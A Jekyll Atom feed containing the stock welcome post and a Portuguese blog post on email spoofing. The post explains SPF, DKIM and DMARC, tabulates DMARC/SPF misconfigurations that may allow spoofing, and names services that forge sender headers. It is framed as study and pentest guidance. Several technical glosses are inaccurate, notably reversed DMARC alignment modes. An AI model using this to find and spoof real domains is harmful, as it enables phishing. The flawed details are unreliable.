<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-02-08T10:42:41-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2023/02/08/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2023-02-08T10:02:24-03:00</published><updated>2023-02-08T10:02:24-03:00</updated><id>http://localhost:4000/jekyll/update/2023/02/08/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2023/02/08/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>Jekyll requires blog post files to be named according to the following format:</p>

<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>

<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">Encontrando possíveis vulnerabilidades de e-mail spoofing</title><link href="http://localhost:4000/estudos/e-mail%20spoofing/2023/01/09/email-spoofing.html" rel="alternate" type="text/html" title="Encontrando possíveis vulnerabilidades de e-mail spoofing" /><published>2023-01-09T01:00:00-03:00</published><updated>2023-01-09T01:00:00-03:00</updated><id>http://localhost:4000/estudos/e-mail%20spoofing/2023/01/09/email-spoofing</id><content type="html" xml:base="http://localhost:4000/estudos/e-mail%20spoofing/2023/01/09/email-spoofing.html"><![CDATA[<p><img src="/img/posts/Pasted%20image%2020230106122723.png" alt="E-mail Spoofing" /></p>

<ul>
  <li><a href="#introdução">Introdução</a></li>
  <li><a href="#e-mail-spoofing"><em>E-mail Spoofing</em></a>
    <ul>
      <li><a href="#impacto-técnico-do-e-mail-spoofing">Impacto técnico do <em>e-mail spoofing</em></a></li>
      <li><a href="#impacto-de-negócio-do-e-mail-spoofing">Impacto de negócio do <em>e-mail spoofing</em></a></li>
    </ul>
  </li>
  <li><a href="#spf">SPF</a>
    <ul>
      <li><a href="#tipos-de-spf">Tipos de SPF</a></li>
      <li><a href="#atributos-do-spf">Atributos do SPF</a></li>
    </ul>
  </li>
  <li><a href="#dkim">DKIM</a></li>
  <li><a href="#dmarc">DMARC</a></li>
  <li><a href="#como-um-servidor-de-e-mails-interpreta-todas-estas-regras">Como um servidor de e-mails interpreta todas estas regras</a>
    <ul>
      <li><a href="#ordem-de-verificação-de-protocolos">Ordem de verificação de protocolos</a></li>
    </ul>
  </li>
  <li><a href="#como-são-feitos-ataques-de-e-mail-spoofing">Como são feitos ataques de <em>e-mail spoofing</em></a></li>
  <li><a href="#encontrando-possíveis-vulnerabilidades-de-e-mail-spoofing">Encontrando possíveis vulnerabilidades de <em>e-mail spoofing</em></a>
    <ul>
      <li><a href="#spf-com--all-hard-fail">SPF com -all (<em>hard fail</em>)</a></li>
      <li><a href="#spf-com-all-soft-fail">SPF com ~all (<em>soft fail</em>)</a></li>
      <li><a href="#spf-com-all-neutral">SPF com ?all (<em>neutral</em>)</a></li>
      <li><a href="#outras-configurações-que-podem-levar-ao-e-mail-spoofing">Outras configurações que podem levar ao <em>e-mail spoofing</em></a></li>
      <li><a href="#automatizando-a-enumeração-das-configurações">Automatizando a enumeração das configurações</a></li>
    </ul>
  </li>
  <li><a href="#boas-práticas-para-dificultar-o-e-mail-spoofing">Boas práticas para dificultar o <em>e-mail spoofing</em></a></li>
  <li><a href="#conclusão">Conclusão</a></li>
  <li><a href="#referências">Referências</a></li>
</ul>

<h2 id="introdução">Introdução</h2>

<p>Imagine explorar uma vulnerabilidade que, aparentemente, dentro do seu escopo de conhecimento, não seria possível de explorar, e como consequência, não saber muito bem o que foi feito.</p>

<p>Pois bem, assim como toda base de conhecimento parte da ignorância, este estudo surgiu de uma situação parecida, onde, em minha singela falta de conhecimento mais profundo, consegui falsificar um e-mail, mesmo pensando que não seria possível. Então surgiu a dúvida: como eu fiz isso?</p>

<p>E na busca da resposta, muita coisa foi aprendida sobre protocolos e configurações que tentarei deixar da forma mais detalhada no decorrer deste artigo.</p>

<p>Como de costume, gosto de deixar um bom embasamento antes de falar sobre vias de fato, portanto, partimos do princípio, entendendo os tópicos base para o assunto.</p>

<h2 id="e-mail-spoofing"><em>E-mail Spoofing</em></h2>

<p>O <em>e-mail spoofing</em>, ou falsificação de <em>e-mail</em>, é a prática de enviar um <em>e-mail</em> com o endereço de remetente falsificado. Isso pode ser feito de várias maneiras, mas a intenção geral é fazer com que o <em>e-mail</em> pareça ter sido enviado por alguém diferente do remetente real e com um nível aparente de autenticidade elevado.</p>

<p>Um dos métodos mais comuns de <em>e-mail spoofing</em> é a alteração do campo “<em>From</em>” de um <em>e-mail</em>. Quando você recebe um <em>e-mail</em>, o endereço no campo “<em>From</em>” é o endereço que o remetente quer que você acredite que enviou o <em>e-mail</em>. No entanto, esse endereço pode facilmente ser alterado para que pareça que foi enviado por outra pessoa.</p>

<p>Outra maneira de fazer <em>e-mail spoofing</em> é alterando o endereço IP do remetente. O endereço IP é um número único atribuído a cada dispositivo que se conecta à internet. Quando um <em>e-mail</em> é enviado, o servidor de <em>e-mail</em> do remetente inclui o endereço IP do remetente no cabeçalho do <em>e-mail</em>. Se um remetente alterar o seu endereço IP para fazer com que pareça que o <em>e-mail</em> foi enviado de outro lugar, isso pode ser considerado <em>e-mail spoofing</em>.</p>

<p>O objetivo do <em>e-mail spoofing</em> geralmente é induzir o destinatário a acreditar que o <em>e-mail</em> é legítimo e realizar alguma ação, como clicar em um link, baixar um anexo ou divulgar informações confidenciais.</p>

<p>Além do impacto financeiro direto, as empresas vítimas de <em>e-mail spoofing</em> também podem enfrentar custos indiretos, como tempo e recursos necessários para investigar e remediar o ataque, bem como possíveis consequências legais e regulatórias.</p>

<h3 id="impacto-técnico-do-e-mail-spoofing">Impacto técnico do <em>e-mail spoofing</em></h3>

<p>O impacto técnico da falsificação de <em>e-mail</em> pode ser significativo, pois permite que os invasores ganhem a confiança do destinatário e possam induzi-lo a divulgar informações confidenciais, como senhas ou informações financeiras. Ele também pode ser usado para espalhar <em>malware</em> ou ataques de <em>phishing</em> para um público mais amplo, pois os <em>e-mails</em> fraudulentos podem ser mais propensos a serem abertos e clicados pelo destinatário devido à percepção de autenticidade do remetente.</p>

<p>Além disso, a falsificação de <em>e-mail</em> pode ser usada para contornar os filtros de <em>spam</em> e enviar <em>e-mails</em> maliciosos diretamente para a caixa de entrada do destinatário, pois os filtros podem não detectar a natureza fraudulenta do <em>e-mail</em>. Isso pode permitir que os invasores ignorem as medidas de segurança e obtenham acesso a sistemas ou dados confidenciais.</p>

<h3 id="impacto-de-negócio-do-e-mail-spoofing">Impacto de negócio do <em>e-mail spoofing</em></h3>

<p>Esse tipo de ataque pode ter impactos de negócio significativos, incluindo:</p>

<ol>
  <li>
    <p><strong>Perda de informações confidenciais</strong>: se um funcionário for vítima de um <em>e-mail</em> falsificado e clicar em um link ou anexo malicioso, isso poderá resultar na perda de informações confidenciais da empresa, como dados financeiros ou registros de clientes.</p>
  </li>
  <li>
    <p><strong>Danos à reputação</strong>: Se um <em>e-mail</em> falsificado for enviado a clientes ou parceiros, isso poderá prejudicar a reputação da empresa. Os clientes podem perder a confiança na empresa e parar de fazer negócios com ela, enquanto os parceiros podem se recusar a trabalhar com uma empresa que foi vítima de um ataque cibernético.</p>
  </li>
  <li>
    <p><strong>Perda financeira</strong>: em alguns casos, <em>e-mails</em> falsificados podem ser usados ​​para induzir os funcionários a transferir dinheiro para o invasor. Isso pode resultar em perdas financeiras significativas para a empresa.</p>
  </li>
  <li>
    <p><strong>Consequências legais</strong>: Se uma empresa sofrer uma violação de dados como resultado de um ataque de <em>e-mail spoofing</em>, poderá enfrentar consequências legais, incluindo multas e penalidades.</p>
  </li>
</ol>

<p>Nesta altura acredito que o ataque de <em>e-mail spoofing</em> ficou claro assim como sua criticidade em um cenário corporativo e pessoal.</p>

<h2 id="spf">SPF</h2>

<p>SPF (<em>Sender Policy Framework</em>) é um mecanismo de autenticação de <em>e-mail</em> usado para ajudar a proteger os destinatários de <em>e-mails</em> falsificados ou “<em>spoofed mails</em>”. Ele permite que os administradores de domínio especifiquem quais servidores de <em>e-mail</em> são autorizados a enviar <em>e-mails</em> em nome de um domínio específico.</p>

<p>Quando um servidor de <em>e-mail</em> recebe um <em>e-mail</em>, ele verifica o registro SPF do domínio do remetente para ver se o servidor que enviou o <em>e-mail</em> está na lista de servidores autorizados. Se o servidor enviou o <em>e-mail</em> não estiver na lista, o <em>e-mail</em> pode ser marcado como <em>spam</em> ou rejeitado completamente.</p>

<p>O SPF é um mecanismo eficaz para ajudar a proteger os destinatários de <em>e-mails</em> falsificados, pois permite que os administradores de domínio especifiquem quais servidores são autorizados a enviar <em>e-mails</em> em nome de seu domínio. No entanto, é importante lembrar que o SPF sozinho não é uma solução completa para a prevenção de <em>e-mail spoofing</em> e deve ser usado em conjunto com outras medidas de segurança, como o <strong>DMARC</strong> (<em>Domain-based Message Authentication, Reporting and Conformance</em>).</p>

<h3 id="tipos-de-spf">Tipos de SPF</h3>

<p>Existem dois tipos principais de SPF: o <strong>SPF básico</strong> e o <strong>SPF estendido</strong>.</p>

<p>O <strong>SPF básico</strong> é o tipo mais simples de SPF e permite que os administradores de domínio especifiquem uma lista de servidores de <em>e-mail</em> autorizados a enviar <em>e-mails</em> em nome de seu domínio. Essa lista é incluída em um registro TXT no DNS (<em>Domain Name System</em>) do domínio.</p>

<p>O <strong>SPF estendido</strong> é uma versão mais avançada do SPF que permite aos administradores de domínio especificar uma lista mais detalhada de servidores de <em>e-mail</em> autorizados a enviar <em>e-mails</em> em nome de seu domínio. Ele também permite aos administradores especificar ações a serem tomadas quando um <em>e-mail</em> é enviado por um servidor não autorizado. As ações podem incluir marcar o <em>e-mail</em> como <em>spam</em> ou rejeitá-lo completamente.</p>

<h3 id="atributos-do-spf">Atributos do SPF</h3>

<p>Existem vários atributos que podem ser incluídos em um registro SPF para especificar quais servidores são autorizados a enviar <em>e-mails</em> em nome de um domínio. Alguns dos principais atributos incluem:</p>

<ul>
  <li><strong>ip4</strong>: Especifica um endereço IP IPv4 autorizado a enviar <em>e-mails</em> em nome do domínio.</li>
  <li><strong>ip6</strong>: Especifica um endereço IP IPv6 autorizado a enviar <em>e-mails</em> em nome do domínio.</li>
  <li><strong>a</strong>: Especifica um nome de host autorizado a enviar <em>e-mails</em> em nome do domínio.</li>
  <li><strong>mx</strong>: Especifica um servidor de <em>e-mail</em> autorizado a enviar <em>e-mails</em> em nome do domínio.</li>
  <li><strong>include</strong>: Permite que um domínio inclua outro domínio em sua política SPF. Geralmente utilizado se um domínio tiver vários servidores de <em>e-mail</em> que enviam <em>e-mails</em> em seu nome.</li>
  <li>
    <p><strong>all</strong>: O atributo <strong>all</strong> é usado no registro SPF para especificar a ação a ser tomada quando um <em>e-mail</em> é enviado por um servidor não autorizado. Existem quatro opções principais para o atributo <strong>all</strong>:</p>

    <ol>
      <li><strong>-all (<em>hard fail</em>)</strong>: Marca o e-mail como spam. Isso é usado quando o remetente quer que todos os <em>e-mails</em> enviados por servidores de e-mail não autorizados sejam marcados como spam.</li>
      <li><strong>~all (<em>soft fail</em>)</strong>: Marca o <em>e-mail</em> como <em>spam</em> com probabilidade baixa. Isso é usado quando o remetente quer permitir que alguns <em>e-mails</em> enviados por servidores de <em>e-mail</em> não autorizados sejam entregues, mas quer que a maioria seja marcada como <em>spam</em>.</li>
      <li><strong>+all (<em>pass</em>)</strong>: Permite o <em>e-mail</em>. Isso é usado quando o remetente quer permitir que todos os <em>e-mails</em> sejam entregues, independentemente de qual servidor os tenha enviado.</li>
      <li><strong>?all (<em>neutral</em>)</strong>: Quando esta opção está configurada, o <em>e-mail</em> é tratado como se não existisse um registro SPF. Geralmente utilizado quando um domínio não pode, ou não quer definir se um determinado servidor está ou não autorizado a enviar <em>e-mails</em> em nome do domínio.</li>
    </ol>
  </li>
</ul>

<p>É importante lembrar que o atributo <strong>all</strong> deve ser usado com cuidado, pois ele determina como os servidores de <em>e-mail</em> lidam com os <em>e-mails</em> enviados por servidores não autorizados. Se o atributo for configurado incorretamente, isso pode levar a <em>e-mails</em> legítimos sendo marcados como <em>spam</em> ou rejeitados completamente.</p>

<p>Estes são apenas alguns dos atributos mais comuns que podem ser incluídos em um registro SPF. Existem outros atributos disponíveis também. É importante lembrar que os registros SPF devem ser mantidos atualizados para garantir que apenas os servidores de <em>e-mail</em> autorizados estejam incluídos na política.</p>

<h2 id="dkim">DKIM</h2>

<p>DKIM (<em>DomainKeys Identified Mail</em>) é uma técnica de autenticação de <em>e-mail</em> que permite verificar a integridade e a origem de um <em>e-mail</em>. Ele foi desenvolvido como uma maneira de combater o <em>spam</em> e a fraude por <em>e-mail</em>, permitindo que os destinatários verifiquem se um <em>e-mail</em> foi realmente enviado pelo remetente que alega ter enviado.</p>

<p>O processo de configuração do DKIM envolve a geração de uma chave privada e pública. A chave privada é usada pelo remetente para assinar os <em>e-mails</em> que enviam, enquanto a chave pública é publicada no DNS do domínio do remetente. Quando um <em>e-mail</em> é enviado, o remetente adiciona um cabeçalho ao <em>e-mail</em> contendo um registro criptografado usando a chave privada.</p>

<p>Quando o <em>e-mail</em> é recebido pelo destinatário, o servidor de <em>e-mail</em> do destinatário procura a chave pública no DNS do domínio do remetente. Se a chave pública estiver disponível, o servidor de <em>e-mail</em> do destinatário usa a chave pública para decifrar o registro criptografado no cabeçalho do <em>e-mail</em>. Se o registro decifrado corresponder ao conteúdo do <em>e-mail</em>, este é considerado autêntico. Se houver alguma diferença entre o registro decifrado e o conteúdo do <em>e-mail</em>, o <em>e-mail</em> pode ser considerado alterado ou falsificado.</p>

<p>O objetivo do DKIM é garantir que os <em>e-mails</em> não sejam alterados durante a transmissão e que eles realmente venham da organização que diz ter enviado. Isso pode ajudar a proteger contra <em>spam</em>, <em>phishing</em> e outras formas de fraude por <em>e-mail</em>.</p>

<h2 id="dmarc">DMARC</h2>

<p>DMARC (<em>Domain-based Message Authentication, Reporting &amp; Conformance</em>) é um protocolo de segurança de <em>e-mail</em> que permite que os remetentes especifiquem qual mecanismo de autenticação de <em>e-mail</em> deve ser usado quando os <em>e-mails</em> são enviados de um determinado domínio. Ele também permite que os remetentes recebam relatórios sobre os <em>e-mails</em> que são enviados em seu nome e que falham na verificação de autenticidade. Isso pode ajudar os remetentes a detectar e prevenir a fraude por <em>e-mail</em>, como <em>spam</em> e <em>phishing</em>.</p>

<p>O DMARC funciona verificando se os mecanismos de autenticação de <em>e-mail</em>, como SPF e DKIM, passam na verificação de autenticidade. Se um <em>e-mail</em> falhar na verificação de autenticidade, o remetente pode optar por rejeitar o <em>e-mail</em> ou colocá-lo na caixa de <em>spam</em>.</p>

<p>Para configurar o DMARC, os remetentes precisam adicionar um registro TXT ao DNS do seu domínio que especifique qual mecanismo de autenticação de <em>e-mail</em> deve ser usado e como os <em>e-mails</em> que falharem na verificação de autenticidade devem ser tratados. Os destinatários podem então verificar o registro DMARC para garantir que o <em>e-mail</em> foi enviado por um remetente legítimo.</p>

<p>Abaixo um exemplo de registro TXT no DNS para configurar o DMARC:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_dmarc.seudominio.com.br. IN TXT "v=DMARC1; p=reject; pct=100; rua=mailto:seuemail@seudominio.com.br"
</code></pre></div></div>

<p>O registro DMARC é composto por vários campos que especificam como o DMARC deve ser usado. Alguns dos campos mais comuns e suas respectivas finalidades são:</p>

<ul>
  <li><strong>v=DMARC1 (<em>version</em>)</strong>: Especifica qual versão do DMARC está sendo usada. Atualmente, a única versão disponível é DMARC1.</li>
  <li><strong>p= (<em>policy</em>)</strong>: Especifica como os <em>e-mails</em> que falharem na verificação de autenticidade devem ser tratados. As opções são “<strong><em>none</em></strong>” (não fazer nada), “<strong><em>quarantine</em></strong>” (colocar na caixa de <em>spam</em>) e “<strong><em>reject</em></strong>” (rejeitar o <em>e-mail</em>).</li>
  <li><strong>pct= (<em>percentage</em>)</strong>: Especifica a porcentagem de <em>e-mails</em> que devem ser verificados pelo DMARC. O valor padrão é 100, o que significa que todos os <em>e-mails</em> serão verificados.</li>
  <li><strong>sp= (<em>subdomain policy</em>)</strong>: Especifica qual mecanismo de autenticação de <em>e-mail</em> deve ser usado para os <em>e-mails</em> enviados de subdomínios. As opções são “<strong><em>none</em></strong>” (não usar autenticação de <em>e-mail</em>), “<strong><em>quarantine</em></strong>” (colocar na caixa de <em>spam</em>) e “<strong><em>reject</em></strong>” (rejeitar o <em>e-mail</em>).</li>
  <li><strong>adkim= (<em>DKIM alignment</em>)</strong>: Especifica qual modo de alinhamento deve ser usado para o DKIM. As opções são “<strong>r</strong>” (rigoroso) e “<strong>s</strong>” (relaxado). O alinhamento rigoroso exige que o remetente e o destinatário usem o mesmo domínio, enquanto o alinhamento relaxado permite que o remetente e o destinatário usem domínios diferentes.</li>
  <li><strong>aspf= (<em>SPF alignment</em>)</strong>: Especifica qual modo de alinhamento deve ser usado para o SPF. As opções são “<strong>r</strong>” (rigoroso) e “<strong>s</strong>” (relaxado). O alinhamento rigoroso exige que o remetente e o destinatário usem o mesmo domínio, enquanto o alinhamento relaxado permite que o remetente e o destinatário usem domínios diferentes.</li>
  <li><strong>rua= (<em>aggregated reports</em>)</strong>: Especifica o endereço de <em>e-mail</em> onde os relatórios DMARC devem ser enviados.</li>
  <li><strong>ruf= (<em>forensic reports</em>)</strong>: Especifica o endereço de <em>e-mail</em> onde os relatórios DMARC de falha de autenticidade devem ser enviados.</li>
</ul>

<h2 id="como-um-servidor-de-e-mails-interpreta-todas-estas-regras">Como um servidor de e-mails interpreta todas estas regras</h2>

<p>De fato, pela criticidade que o <em>e-mail spoofing</em> pode atingir, foram criadas vários protocolos para se certificar da autenticidade de <em>e-mails</em> recebidos e métodos para diminuir este tipo de ação. Porém, dada a delicadeza do processo de envio e recebimento de <em>e-mails</em>, que pode ter diversas regras de negócio, várias opções foram criadas para cada protocolo, que podem e são interpretadas tanto pelo servidor de recebimento, quanto de envio de <em>e-mails</em>.</p>

<p>As configurações de cada protocolo são estritamente feitas, com base na regra de negócio. Enquanto uma configuração extremamente restrita pode ocasionar problemas de recebimento de <em>e-mails</em> autênticos, uma configuração relaxada pode facilitar a falsificação de <em>e-mails</em>, e por sua vez, uma configuração moderada pode evitar problemas de envio/recebimento assim como também abrir caminho para a falsificação de <em>e-mails</em>.</p>

<h3 id="ordem-de-verificação-de-protocolos">Ordem de verificação de protocolos</h3>

<p>Não há uma ordem específica em que os servidores de <em>e-mail</em> devem verificar o DMARC ou o SPF. Alguns servidores podem verificar o SPF primeiro, enquanto outros podem verificar o DMARC primeiro. Alguns servidores também podem usar outras técnicas de autenticação, como a verificação de chave DKIM, antes de verificar o SPF ou o DMARC.</p>

<p>A ordem em que os servidores de <em>e-mail</em> verificam os diferentes métodos de autenticação de <em>e-mail</em> pode variar dependendo de vários fatores, como as configurações do servidor, as políticas de segurança do <em>e-mail</em> da empresa e as práticas recomendadas pelos fornecedores de serviços de <em>e-mail</em>.</p>

<h2 id="como-são-feitos-ataques-de-e-mail-spoofing">Como são feitos ataques de <em>e-mail spoofing</em></h2>

<p>Conforme visto anteriormente, um ataque de <em>e-mail spoofing</em> pode ser feito ao modificar informações de um cabeçalho de <em>e-mail</em>. Os atacantes podem modificar o cabeçalho do <em>e-mail</em> para fazer com que pareça que o <em>e-mail</em> foi enviado por outra pessoa ou empresa.</p>

<p>Isso pode ser feito diretamente no servidor de envio de <em>e-mails</em>, ou <strong>SMTP</strong> (<em>Simple Mail Transfer Protocol</em>). Existem plataforma conhecidas e específicas que “automatizam” estas alterações no cabeçalho permitindo a exploração da vulnerabilidade, como o <a href="https://emkei.cz/">Emkey’s Mailer</a> e o <a href="https://anonymailer.net/">Anonymailer</a>.</p>

<p>Este ataque também pode surgir de um servidor SMTP “mal configurado” que permite a alteração de informações de cabeçalho ao enviar <em>e-mails</em>.</p>

<h2 id="encontrando-possíveis-vulnerabilidades-de-e-mail-spoofing">Encontrando possíveis vulnerabilidades de <em>e-mail spoofing</em></h2>

<p>Uma vez que sabemos da existência de diversas combinações de configuração, principalmente entre SPF e DMARC, e de que a checagem ocorre nas duas pontas, destinatário e remetente, a possibilidade de uma exploração de <em>e-mail spoofing</em> bem-sucedida se torna uma questão de “ligar os pontos”.</p>

<p>Mas é importante ressaltar que, como esta análise é feita exclusivamente nas configurações de protocolos, mesmo que os registros sejam aparentemente vulneráveis a <em>spoofing</em>, ainda há grandes possibilidades de serviços de terceiros mitigarem a exploração, como filtros e <em>firewalls</em> de e-mail. Porém, não impede que uma tentativa seja feita em uma situação de um <em>pentest</em> ou qualquer outro teste <strong>dentro de parâmetros legais</strong>.</p>

<p>Partindo deste princípio, e de experiência no mundo real, é possível enumerar possíveis vetores de ataque em potencial. Sabendo que o SPF tem quantidade reduzida de parâmetros em comparação ao DMARC, a seguir serão expressas possibilidades com base nas diferentes variações da propriedade <strong>all</strong>.</p>

<h3 id="spf-com--all-hard-fail">SPF com -all (<em>hard fail</em>)</h3>

<p>Durante muito tempo, eu mesmo acreditei que se o atributo <strong>-all</strong> do SPF era suficiente para bloquear um ataque de <em>e-mail spoofing</em>, porém com a presença (ou não) de algumas configurações de DMARC, ainda é possível realizar um ataque.</p>

<p>A tabela abaixo, mostra combinações de atributos DMARC e possíveis consequências:</p>

<table>
  <thead>
    <tr>
      <th><strong>Configurações DMARC</strong></th>
      <th><strong>Possível consequência</strong></th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>p=</strong> e <strong>aspf=</strong> configurados e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>ausência de <strong>aspf</strong> e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td><strong>p=none</strong> e <strong>aspf=r</strong> ou ausência de <strong>aspf=</strong></td>
      <td><em>Spoofing</em> possível a depender da política do destinatário</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>aspf=r</strong> e <strong>sp=reject</strong> ou <strong>sp=quarentine</strong></td>
      <td>Possível <em>spoofing</em> dentro do domínio (destinatário e remetente dentro da mesma organização)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, ausência de <strong>aspf=</strong> e <strong>sp=reject</strong> ou <strong>sp=quarentine</strong></td>
      <td>Possível <em>spoofing</em> dentro do domínio (destinatário e remetente dentro da mesma organização)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>sp=none</strong> e ausência de <strong>aspf=</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="spf-com-all-soft-fail">SPF com ~all (<em>soft fail</em>)</h3>

<p>O atributo <strong>~all</strong> por sí só já é mais flexível, permitindo possibilidades de <em>spoofing</em> mesmo com regras mais rígidas no DMARC.</p>

<p>A tabela abaixo, mostra combinações de atributos DMARC e possíveis consequências:</p>

<table>
  <thead>
    <tr>
      <th><strong>Configurações DMARC</strong></th>
      <th><strong>Possível consequência</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>p=none</strong> <strong>sp=reject</strong> ou <strong>sp=quarentine</strong></td>
      <td>Possível <em>spoofing</em> dentro do domínio (destinatário e remetente dentro da mesma organização)</td>
    </tr>
    <tr>
      <td><strong>p=none</strong> e ausência de <strong>sp=</strong></td>
      <td>Possível <em>spoofing</em></td>
    </tr>
    <tr>
      <td><strong>p=none</strong> e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio e possível <em>spoofing</em> dentro do domínio (destinatário e remetente dentro da mesma organização)</td>
    </tr>
    <tr>
      <td><strong>p=reject</strong> ou <strong>p=quarentine</strong>, ausência de <strong>aspf=</strong> e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
    </tr>
    <tr>
      <td><strong>p=reject</strong> ou <strong>p=quarentine</strong>, <strong>aspf=</strong> configurado e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
    </tr>
  </tbody>
</table>

<h3 id="spf-com-all-neutral">SPF com ?all (<em>neutral</em>)</h3>

<p>O atributo <strong>~all</strong> faz com que o registro SPF de fato exista (o DMARC exige que o SPF ou DKIM existam para que seja configurado), mas não impõe nenhuma regra, como se não estivesse presente.</p>

<p>Esta configuração, faz com que a autenticação seja feita somente pelo DMARC ou DKIM, quando presente.</p>

<p>A tabela abaixo, mostra combinações de atributos DMARC e possíveis consequências:</p>

<table>
  <thead>
    <tr>
      <th><strong>Configurações DMARC</strong></th>
      <th><strong>Possível consequência</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>p=reject</strong> ou <strong>p=quarentine</strong>, <strong>aspf=</strong> configurado e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio a depender da política do destinatário</td>
    </tr>
    <tr>
      <td><strong>p=reject</strong> ou <strong>p=quarentine</strong>, ausência de <strong>aspf=</strong> e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio a depender da política do destinatário</td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>aspf=r</strong> e ausência de <strong>sp=</strong></td>
      <td>Possível <em>spoofing</em></td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>aspf=r</strong> e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>aspf=s</strong> ou ausência de <strong>aspf=</strong> e <strong>sp=none</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio</td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>aspf=s</strong> ou ausência de <strong>aspf=</strong> e ausência de <strong>sp=</strong></td>
      <td>Possível <em>spoofing</em> de subdomínio a depender da política do destinatário</td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, <strong>aspf=</strong> configurado e <strong>sp=reject</strong> ou <strong>sp=quarentine</strong></td>
      <td>Possível <em>spoofing</em> dentro do domínio (destinatário e remetente dentro da mesma organização)</td>
    </tr>
    <tr>
      <td><strong>p=none</strong>, auseência de <strong>aspf=</strong> e <strong>sp=reject</strong></td>
      <td>Possível <em>spoofing</em> dentro do domínio (destinatário e remetente dentro da mesma organização)</td>
    </tr>
  </tbody>
</table>

<h3 id="outras-configurações-que-podem-levar-ao-e-mail-spoofing">Outras configurações que podem levar ao <em>e-mail spoofing</em></h3>

<p>Além destas combinações de configurações possíveis entre SPF e DMARC, existem outros fatores que podem possibilitar a falsificação de <em>e-mails</em>. Abaixo um descritivo:</p>

<ul>
  <li><strong>pct=</strong> com qualquer valor menor que 100: Significa que não serão todos os <em>e-mails</em> que passarão pela validação de autenticidade, logo pode levar ao <em>spoofing</em>.</li>
  <li>Registro SPF com vários domínios no <strong><em>include</em></strong>: A existência de vários domínios permitidos no envio de <em>e-mails</em> pode levar a divergências de configuração no registro TXT levando ao <em>spoofing.</em></li>
  <li>Mais de um atributo <strong>all</strong> no mesmo registro TXT sem o <strong>p=</strong> no DMARC.</li>
  <li>Ausência de registro SPF e ausência do <strong>p=</strong> no DMARC.</li>
  <li>Qualquer opção de atributo <strong>all</strong> sem o <strong>p=</strong> no DMARC.</li>
</ul>

<h3 id="automatizando-a-enumeração-das-configurações">Automatizando a enumeração das configurações</h3>

